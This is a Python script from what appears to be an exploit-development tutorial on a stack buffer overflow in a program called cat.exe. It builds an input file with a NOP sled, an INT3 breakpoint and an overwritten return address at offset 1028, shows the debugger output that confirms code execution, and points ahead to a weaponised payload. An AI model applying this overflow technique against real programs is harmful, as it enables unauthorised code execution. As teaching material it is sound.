"""

## `fuzz4.py`

### .. Test

 * Let our pattern start with a nop sled 0x90 up to, and add a breakpoint 0xCC at, offset 1027.
 * Writing the address of our pattern start to the stack at offset 1028.
 * Execute code?!
 * ...
 * Profit!
 
```
> fuzz4.py
> ImmunityDebugger.exe cat.exe pattern.dat
```
 
### .. Result

```
771A1AD7   [22:45:17] Single step event at ntdll.771A1AD7
00401000   [22:45:22] Program entry point
0019FE57   [22:45:28] INT3 command at 0019FE57 <-- !!! 0xCC INT3 COMMAND !!!
```

### .. Question

 * What caused our address at offset 1028 to be executed?
 
   a. Writing an address to the stack which is used in a call instruction.
   b. Writing an address to the stack which is a return address.
   c. Writing code to the stack that further executes the stack.

### .. Conclusion

 * It's possible to write an address to the stack which is executed.
 * It's possible to write code to the stack which is executed.

> This leaves us with 1028 bytes for a payload to weaponize this exploit.
  See `fuzz5.py` which will use a payload.

"""

from struct import pack

# start address of our shellcode
address = 0x19FA54
# offset for the address
offset = 1028

with open('pattern.dat', 'w') as f:
	# Nop sled
	f.write("\x90" * (offset - 1)) 
	# Breakpoint
	f.write("\xCC")
	# Address
	f.write(pack('i', address))
